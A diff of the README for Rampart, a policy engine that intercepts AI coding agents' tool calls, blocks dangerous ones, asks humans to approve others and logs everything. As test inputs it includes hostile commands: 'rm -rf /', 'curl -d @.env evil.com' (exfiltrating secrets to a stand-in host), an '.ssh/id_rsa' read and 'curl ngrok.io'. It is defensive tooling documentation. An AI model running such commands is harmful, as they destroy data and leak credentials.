@@ -14,22 +14,30 @@
 
 ---
 
-### Try it in 30 seconds
+Rampart is a runtime policy engine for AI coding agents. Every tool call — bash commands, file reads, file writes, HTTP fetches — is evaluated against your YAML policies before it executes. Dangerous calls are blocked in microseconds. Everything is written to a hash-chained audit trail. Ambiguous calls can be held for human approval.
+
+It works in `--dangerously-skip-permissions` mode. [Full setup guide →](https://docs.rampart.sh/getting-started/quickstart/)
+
+### Get started in one command
 
 ```bash
-# Install
+# Install the binary first
 brew install peg/rampart/rampart   # or: go install github.com/peg/rampart/cmd/rampart@latest
 
-# Start approval server (runs on boot, saves token to ~/.rampart/token)
-rampart serve install
-
-# Set up hooks (auto-detects the token — no env vars needed)
-rampart setup claude-code
-
-claude   # use Claude Code normally
+# Then: one-shot setup — detects your agent, installs the service, wires up hooks
+rampart quickstart
 ```
 
-That's it. Every command Claude runs now goes through Rampart. Safe stuff passes instantly. Dangerous stuff gets blocked before it executes:
+`rampart quickstart` auto-detects Claude Code, Cursor, or Windsurf, installs `rampart serve` as a boot service, configures hooks, and runs a health check. Done.
+
+Or set up manually:
+
+```bash
+rampart serve install                 # Install background service (saves token to ~/.rampart/token)
+rampart setup claude-code             # Wire up Claude Code hooks
+```
+
+Once running, every command Claude executes goes through Rampart's policy engine first:
 
 ```
 ✅ 14:23:01  exec  "npm test"                          [allow-dev]
@@ -39,13 +47,9 @@ That's it. Every command Claude runs now goes through Rampart. Safe stuff passes
 👤 14:23:10  exec  "kubectl apply -f prod.yaml"         [require-approval]
 ```
 
-Works in `--dangerously-skip-permissions` mode. [Full setup guide →](https://docs.rampart.sh/getting-started/quickstart/)
-
 ---
 
-Running Claude Code in yolo mode? Letting agents manage your infrastructure unsupervised? Rampart gives you visibility and control — every tool call gets evaluated against your policy before it executes. Dangerous commands get blocked in microseconds. Everything gets logged to a hash-chained audit trail.
-
-## How It Works
+## How it works
 
 ```mermaid
 graph LR
@@ -81,14 +85,14 @@ graph LR
     style SB fill:#2d333b,stroke:#f0883e,stroke-width:2px,stroke-dasharray: 5 5
 ```
 
-*Pattern matching handles 95%+ of decisions in microseconds. The optional [rampart-verify](https://github.com/peg/rampart-verify) sidecar adds LLM-based classification for ambiguous commands. All decisions are written to a hash-chained audit trail.*
+*Pattern matching handles 95%+ of decisions in microseconds. The optional [rampart-verify](https://github.com/peg/rampart-verify) sidecar adds LLM-based classification for ambiguous commands. All decisions go to a hash-chained audit trail.*
 
 | Agent | Setup | Integration |
 |-------|-------|-------------|
 | **Claude Code** | `rampart setup claude-code` | Native `PreToolUse` hooks — works in `--dangerously-skip-permissions` mode |
 | **OpenClaw** | `rampart setup openclaw` | Shell shim with human-in-the-loop approval flow. Add `--patch-tools` for file read/write coverage |
 | **Cline** | `rampart setup cline` | Native hooks via settings |
-| **Cursor** | `rampart setup cursor` | MCP proxy configuration |
+| **Cursor** | `rampart mcp -- cursor` | MCP proxy configuration |
 | **Any agent** | `rampart wrap -- <agent>` | Shell wrapping via `$SHELL` |
 | **MCP servers** | `rampart mcp -- <server>` | MCP protocol proxy |
 | **System-wide** | `rampart preload -- <cmd>` | LD_PRELOAD syscall interception |
@@ -127,38 +131,39 @@ go install github.com/peg/rampart/cmd/rampart@latest
 
 > **Note:** Make sure `rampart` is in your PATH. For `go install`, add `$(go env GOPATH)/bin` to your shell profile, or symlink: `sudo ln -sf $(go env GOPATH)/bin/rampart /usr/local/bin/rampart`
 >
-> Run `rampart version` to confirm the installed version.
+> Run `rampart version` to confirm.
+
+After installing the binary, run `rampart quickstart` to set everything up in one shot, or follow the manual steps below.
 
 ---
 
-## Claude Code Integration
+## Claude Code integration
 
 Native integration through Claude Code's hook system:
 
 ```bash
-# Install
-brew install peg/rampart/rampart   # or: go install github.com/peg/rampart/cmd/rampart@latest
-
-# Start approval server (runs on boot, saves token to ~/.rampart/token)
+# Start the background service (installs to systemd/launchd, saves token to ~/.rampart/token)
 rampart serve install
 
-# Set up hooks (auto-detects the token — no env vars needed)
+# Wire up Claude Code hooks (auto-discovers the service — no env vars needed)
 rampart setup claude-code
 ```
 
-Every Bash command, file read, and file write goes through Rampart's policy engine before execution. Blocked commands never run. The hook auto-discovers `rampart serve` — no `--serve-url` flag needed.
+Every Bash command, file read, and file write goes through Rampart's policy engine before execution. Blocked commands never run.
 
 Then just use Claude Code normally:
+
 ```bash
 claude
 ```
 
 See what's happening in real time:
+
 ```bash
 rampart watch
 ```
 
-## Wrap Any Agent
+## Wrap any agent
 
 For agents without a hook system, `wrap` sets `$SHELL` to a policy-checking shim. Works with any agent that reads the `$SHELL` environment variable (Aider, OpenCode, Continue, Cline, and more):
 
@@ -168,7 +173,7 @@ rampart wrap -- opencode
 rampart wrap -- python my_agent.py
 ```
 
-## Protect Any Process (LD_PRELOAD)
+## Protect any process (LD_PRELOAD)
 
 For agents with no hook system and no `$SHELL` support, `preload` intercepts exec-family syscalls at the OS level. This is the universal fallback — it works with **any** dynamically-linked process:
 
@@ -198,7 +203,7 @@ See [`preload/README.md`](preload/README.md) for build instructions and details.
 
 ---
 
-## Protect MCP Servers
+## Protect MCP servers
 
 Drop-in proxy between your agent and any MCP server. Evaluates every `tools/call` against your policies:
 
@@ -208,6 +213,7 @@ rampart mcp -- npx @modelcontextprotocol/server-filesystem /path
 ```
 
 In your MCP config (Claude Code, Cursor, etc.):
+
 ```json
 {
   "mcpServers": {
@@ -221,7 +227,7 @@ In your MCP config (Claude Code, Cursor, etc.):
 
 Denied tool calls return a JSON-RPC error — the MCP server never sees them. Safe calls pass through transparently. Tools with destructive keywords (delete, destroy, remove) are blocked out of the box.
 
-### Auto-Generate Policies from MCP Servers
+### Auto-generate policies from MCP servers
 
 Don't write policies from scratch — scan an MCP server's tool list and generate a deny-by-default policy:
 
@@ -231,44 +237,37 @@ rampart mcp scan -- npx @modelcontextprotocol/server-filesystem .
 
 Review, customize, deploy. Each tool becomes an explicit rule you can allow or deny.
 
-```bash
-# Dry run — log everything, block nothing
-rampart wrap --mode monitor -- your-agent
-
-# Custom policy file
-rampart wrap --config my-policy.yaml -- your-agent
-```
-
 ---
 
-## Quick Start
+## Quick start
 
 ```bash
-# Set up Claude Code integration (one command)
-rampart setup claude-code
+# One-shot setup: detects your agent, installs the service, wires hooks, runs health check
+rampart quickstart
 
-# Or wrap any agent
-rampart wrap -- aider
+# Or set up for a specific agent
+rampart setup claude-code     # Claude Code native hooks
+rampart wrap -- aider         # Any agent that reads $SHELL
 
-# Or start the HTTP proxy
-rampart serve
-
-# Test the policy engine directly
+# Test a command against your policies without running it
 echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | rampart hook
 # → {"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"Rampart: Destructive command blocked"}}
+
+# Or test directly
+rampart test "rm -rf /"
 ```
 
 Three built-in profiles:
 
 | Profile | Default | Use case |
 |---------|---------|----------|
-| `standard` | allow | Block dangerous, log suspicious, allow the rest |
+| `standard` | allow | Block dangerous, watch suspicious, allow the rest |
 | `paranoid` | deny | Explicit allowlist for everything |
 | `yolo` | allow | Log-only, no blocking |
 
 ---
 
-## Writing Policies
+## Writing policies
 
 Policies are YAML. Glob matching, hot-reload on file change.
 
@@ -306,11 +305,18 @@ policies:
         message: "Exfiltration domain blocked"
 ```
 
-**Evaluation:** Deny always wins. Lower priority number = evaluated first. Four actions: `deny`, `require_approval`, `watch`, `allow`. (`log` is a deprecated alias for `watch`.)
+**Evaluation:** Deny always wins. Lower priority number = evaluated first. Four actions: `deny`, `require_approval`, `watch`, `allow`. (`log` is a deprecated alias for `watch` — update your policies if you use it.)
 
-### Project-Local Policies
+### Project-local policies
 
-Drop `.rampart/policy.yaml` in any git repo to add project-specific rules that apply on top of your global policy. Commit it so every team member gets the same rules automatically — zero per-developer configuration.
+Drop `.rampart/policy.yaml` in any git repo to add project-specific rules on top of your global policy. Commit it so every team member gets the same rules automatically — zero per-developer configuration.
+
+```bash
+# Scaffold a project policy in the current repo
+rampart init --project
+```
+
+Or create it manually:
 
 ```bash
 mkdir -p .rampart && cat > .rampart/policy.yaml << 'EOF'
@@ -330,9 +336,11 @@ git add .rampart/policy.yaml && git commit -m "Add Rampart project policy"
 
 Global policy always takes precedence for `default_action`. Set `RAMPART_NO_PROJECT_POLICY=1` to skip project policy loading.
 
-### Session Identity
+Run `rampart doctor` in any repo — it reports whether a project policy is found.
 
-Audit events are tagged with the current session (`reponame/branch`, auto-detected from git). Use `session_matches` in policy rules to apply stricter rules to specific repos or branches:
+### Session identity
+
+Audit events are tagged with the current session, auto-detected from git as `reponame/branch` (e.g. `myapp/main`). Use `session_matches` in policy rules to apply stricter rules to specific repos or branches:
 
 ```yaml
 rules:
@@ -342,11 +350,11 @@ rules:
     message: "Exec on production branch requires approval"
 ```
 
-Override the session label with `RAMPART_SESSION=my-label`.
+Override the auto-detected label with `RAMPART_SESSION=my-label`.
 
 ---
 
-## Approval Flow
+## Approval flow
 
 For the grey area — commands that need a human to decide:
 
@@ -361,6 +369,8 @@ policies:
           command_matches: ["kubectl apply *", "terraform apply *"]
         message: "Production deployment requires approval"
 ```
+
+Pending approvals expire after **1 hour** by default (configurable with `--approval-timeout`).
 
 How approval reaches you depends on your environment:
 
@@ -384,9 +394,9 @@ graph LR
 ```
 
 ```bash
-rampart pending                          # What's waiting
-rampart approve abc123                   # Let it through
-rampart deny abc123 --reason "not now"   # Block it
+rampart pending                # What's waiting
+rampart approve abc123         # Let it through
+rampart deny abc123            # Block it
 ```
 
 ---
@@ -407,7 +417,7 @@ No side effects. For agents that plan before acting.
 
 ---
 
-## Audit Trail
+## Audit trail
 
 Every tool call is logged to hash-chained JSONL. Each entry includes a SHA-256 hash of the previous entry — tamper with any record and the chain breaks.
 
@@ -422,19 +432,19 @@ Why hash-chained: in regulated environments, you need to prove what your agent d
 
 ---
 
-## Live Dashboard
+## Live dashboard
 
 ```bash
 rampart watch           # TUI — live colored event stream in your terminal
 ```
 
-When `rampart serve` is running, a web dashboard is also available at **http://localhost:18275/dashboard/**
+When `rampart serve` is running, a web dashboard is also available at **http://localhost:9090/dashboard/** (or **http://localhost:18275/dashboard/** if installed via `rampart serve install`).
 
-The v2 dashboard has four tabs:
-- **Pending** — approve or deny queued requests in real time
-- **History** — browse past tool calls with filtering
-- **Audit Log** — hash-chained log viewer
-- **Rules** — manage policy rules; "Always Allow" persists a rule to your policy file
+The dashboard has three tabs:
+
+- **Active** — live stream of tool calls; approve or deny queued requests in real time
+- **History** — browse past tool calls with filtering by tool, decision, and time
+- **Policy** — view loaded rules; test commands against your policy with the **"Try a command"** REPL before they ever run
 
 Supports dark and light theme. No extra setup needed — it's built into `rampart serve`.
 
@@ -448,13 +458,13 @@ Supports dark and light theme. No extra setup needed — it's built into `rampar
 ║  ✅ 21:03:35 exec  "npm test"                 [allow-dev]   ║
 ║  🟡 21:03:33 exec  "curl https://api.io"      [log-http]    ║
 ╠══════════════════════════════════════════════════════════════╣
-║  1,247 total │ 1,201 allow │ 12 deny │ 34 log               ║
+║  1,247 total │ 1,201 allow │ 12 deny │ 34 watch             ║
 ╚══════════════════════════════════════════════════════════════╝
 ```
 
 ---
 
-## Webhook Notifications
+## Webhook notifications
 
 Get real-time alerts when Rampart blocks something. Add a `notify` section to your policy file:
 
@@ -465,7 +475,7 @@ default_action: allow
 notify:
   url: "https://discord.com/api/webhooks/your/webhook"
   # Or Slack: "https://hooks.slack.com/services/your/webhook"
-  on: ["deny"]  # Only notify on denied commands (options: deny, log)
+  on: ["deny"]  # Only notify on denied commands (options: deny, watch)
 
 policies:
   # ... your policies
@@ -482,7 +492,7 @@ Rampart sends a JSON payload to your webhook URL whenever a matching event occur
   "policy": "protect-sys",
   "message": "Destructive command blocked",
   "agent": "claude-code",
-  "session": "abc123"
+  "session": "myapp/main"
 }
 ```
 
@@ -490,7 +500,7 @@ Works with Discord webhooks, Slack incoming webhooks, or any HTTP endpoint that 
 
 ---
 
-## SIEM Integration
+## SIEM integration
 
 Send audit events to your existing security stack. Three output formats, works with any SIEM:
 
@@ -511,7 +521,7 @@ All three outputs run alongside the default JSONL audit trail — you don't lose
 
 ---
 
-## Webhook Actions
+## Webhook actions
 
 Delegate allow/deny decisions to an external service — LLM-based intent verification, Slack approval bots, custom logic:
 
@@ -534,7 +544,7 @@ The webhook receives the full tool call context and returns `{"decision": "allow
 
 ## Integration
 
-### HTTP Proxy
+### HTTP proxy
 
 Anything that can make HTTP requests works with Rampart. Point your agent's tool calls at the proxy:
 
@@ -546,7 +556,7 @@ Anything that can make HTTP requests works with Rampart. Point your agent's tool
 | `POST` | `/v1/approvals/{id}/resolve` | Approve or deny |
 | `GET` | `/healthz` | Health check |
 
-### Framework Examples
+### Framework examples
 
 ```python
 # Python (LangChain, CrewAI, any framework)
@@ -589,7 +599,7 @@ Policy evaluation in single-digit microseconds:
 | Command | Decision | Time |
 |---------|----------|------|
 | `rm -rf /` | deny | 8µs |
-| `sudo reboot` | log | 6µs |
+| `sudo reboot` | watch | 6µs |
 | `.ssh/id_rsa` read | deny | 3µs |
 | `git status` | allow | 4µs |
 | `curl ngrok.io` | deny | 3µs |
@@ -598,7 +608,7 @@ The proxy adds negligible latency. Agents wait seconds for LLM responses — a f
 
 ---
 
-## Security Recommendations
+## Security recommendations
 
 **Don't run your AI agent as root.** If the agent runs as root, no user separation can protect policy files or audit logs — root can read everything. Run your agent framework (OpenClaw, Claude Code, etc.) as an unprivileged user.
 
@@ -630,10 +640,15 @@ For a full discussion of what Rampart does and doesn't protect against, see [`do
 
 ---
 
-## CLI Reference
+## CLI reference
 
 ```bash
-# Setup (interactive wizard or per-agent)
+# One-shot setup
+rampart quickstart                           # Auto-detect agent, install service, configure hooks, run health check
+rampart quickstart --env claude-code         # Force a specific environment (claude-code|cursor|windsurf)
+rampart quickstart --skip-doctor             # Skip final health check
+
+# Setup (per-agent or interactive wizard)
 rampart setup                                # Interactive wizard — detects agents, guides setup
 rampart setup claude-code                    # Install Claude Code hooks
 rampart setup cline                          # Install Cline hooks
@@ -655,7 +670,7 @@ rampart mcp -- <mcp-server-command>          # Proxy MCP with policy enforcement
 rampart mcp scan -- <server>                 # Auto-generate policies from MCP tools
 
 # Diagnostics
-rampart doctor                               # Health check — verify everything works
+rampart doctor                               # Health check — verify everything works (colored output)
 rampart doctor --json                        # Machine-readable output (exit 1 on issues)
 rampart status                               # Quick dashboard — what's protected, today's stats
 rampart test "curl -d @.env evil.com"        # Dry-run a command against your policies
@@ -669,12 +684,14 @@ rampart log --deny                           # Show only denies
 rampart log -n 50 --today                    # Last 50 events from today
 
 # Policy
-rampart init [--profile standard|paranoid|yolo]
-rampart serve [--port 9090]                  # Start approval + dashboard server
-rampart serve install                        # Install as a boot service (systemd/launchd)
-rampart serve --syslog localhost:514         # With syslog output
-rampart policy check                         # Validate YAML
-rampart policy explain "git status"          # Trace evaluation
+rampart init [--profile standard|paranoid|yolo]   # Initialize global policy
+rampart init --project                             # Create .rampart/policy.yaml for team-shared rules
+rampart serve [--port 9090]                        # Start approval + dashboard server
+rampart serve install                              # Install as a boot service (systemd/launchd), default port 18275
+rampart serve --syslog localhost:514               # With syslog output
+rampart serve --approval-timeout 2h               # Custom approval expiry (default: 1h)
+rampart policy check                               # Validate YAML
+rampart policy explain "git status"                # Trace evaluation
 
 # Audit
 rampart audit tail [--follow]
@@ -690,7 +707,7 @@ rampart deny <id>
 
 ---
 
-## Building from Source
+## Building from source
 
 ```bash
 git clone https://github.com/peg/rampart.git
@@ -713,7 +730,7 @@ cd rampart
 go test ./...
 ```
 
-All work goes through the `staging` branch. PRs to `main` require one approving review.
+All work goes through the `staging` branch. PRs to `main` require one approving review. See [CONTRIBUTING.md](CONTRIBUTING.md) if it exists, or open an issue to discuss.
 
 ---
 
@@ -733,7 +750,7 @@ See [`docs/ROADMAP.md`](docs/ROADMAP.md) for what's planned. Priorities shift ba
 | Aider | `rampart wrap` | Linux, macOS |
 | OpenCode | `rampart wrap` | Linux, macOS |
 | Continue | `rampart wrap` | Linux, macOS |
-| Cursor | `rampart wrap` + `rampart mcp` | Linux, macOS |
+| Cursor | `rampart mcp` | MCP server proxying, all platforms |
 | Windsurf | `rampart wrap` | Linux, macOS |
 | Python agents | `rampart preload` or HTTP API | Linux, macOS |
 | Node.js agents | `rampart preload` or HTTP API | Linux, macOS |
